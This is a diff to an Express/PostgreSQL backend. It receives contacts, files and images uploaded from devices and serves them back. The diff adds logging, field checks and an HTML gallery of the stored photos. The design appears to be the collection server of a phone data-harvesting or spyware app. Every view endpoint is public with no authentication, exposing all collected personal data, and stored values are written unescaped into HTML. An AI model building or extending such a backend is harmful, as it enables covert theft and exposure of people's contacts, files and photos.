@@ -5,7 +5,7 @@ const { Pool } = require("pg");
 const app = express();
 app.use(bodyParser.json({ limit: "50mb" }));
 
-// PostgreSQL connection (Render ENV)
+// PostgreSQL connection
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: {
@@ -13,7 +13,7 @@ const pool = new Pool({
   }
 });
 
-// Create tables
+// ================== INIT DB ==================
 async function initDB() {
   try {
     await pool.query(`
@@ -41,50 +41,51 @@ async function initDB() {
 
     console.log("Tables created successfully");
   } catch (err) {
-    console.error("Error creating tables:", err);
+    console.error("DB Error:", err);
   }
 }
-
 initDB();
 
-
-// ================== RECEIVE DATA FROM APP ==================
+// ================== RECEIVE DATA ==================
 app.post("/receive", async (req, res) => {
   try {
+    console.log("Incoming Data:", req.body);
+
     const { type, device_id, data } = req.body;
+
+    if (!type || !data) {
+      return res.status(400).send("Missing fields");
+    }
 
     if (type === "contacts") {
       await pool.query(
         "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2)",
-        [device_id, JSON.stringify(data)]
+        [device_id || "unknown", JSON.stringify(data)]
       );
     }
 
     if (type === "files") {
       await pool.query(
         "INSERT INTO files (device_id, file_data) VALUES ($1, $2)",
-        [device_id, JSON.stringify(data)]
+        [device_id || "unknown", JSON.stringify(data)]
       );
     }
 
     if (type === "images") {
       await pool.query(
         "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
-        [device_id, data]
+        [device_id || "unknown", data]
       );
     }
 
     res.send("Data saved successfully");
   } catch (err) {
-    console.error(err);
+    console.error("ERROR:", err);
     res.status(500).send("Error saving data");
   }
 });
 
-
-// ================== VIEW DATA APIs ==================
-
-// View contacts
+// ================== VIEW CONTACTS ==================
 app.get("/contacts", async (req, res) => {
   try {
     const result = await pool.query("SELECT * FROM contacts ORDER BY id DESC");
@@ -94,7 +95,7 @@ app.get("/contacts", async (req, res) => {
   }
 });
 
-// View files
+// ================== VIEW FILES ==================
 app.get("/files", async (req, res) => {
   try {
     const result = await pool.query("SELECT * FROM files ORDER BY id DESC");
@@ -104,18 +105,32 @@ app.get("/files", async (req, res) => {
   }
 });
 
-// View images
+// ================== VIEW IMAGES (FIXED) ==================
 app.get("/images", async (req, res) => {
   try {
     const result = await pool.query("SELECT * FROM images ORDER BY id DESC");
-    res.json(result.rows);
+
+    let html = "<h1>Stored Images</h1>";
+
+    result.rows.forEach(row => {
+      html += `
+        <div style="margin-bottom:20px;">
+          <p><b>ID:</b> ${row.id}</p>
+          <img src="data:image/jpeg;base64,${row.image_data}" 
+               width="300" 
+               style="border-radius:10px; box-shadow:0 0 10px gray;" />
+        </div>
+      `;
+    });
+
+    res.send(html);
+
   } catch (err) {
     res.status(500).send(err.message);
   }
 });
 
-
-// ================== SIMPLE HOME PAGE ==================
+// ================== HOME ==================
 app.get("/", (req, res) => {
   res.send(`
     <h1>Backend Running ✅</h1>
@@ -127,7 +142,6 @@ app.get("/", (req, res) => {
     </ul>
   `);
 });
-
 
 // ================== START SERVER ==================
 const PORT = process.env.PORT || 3000;
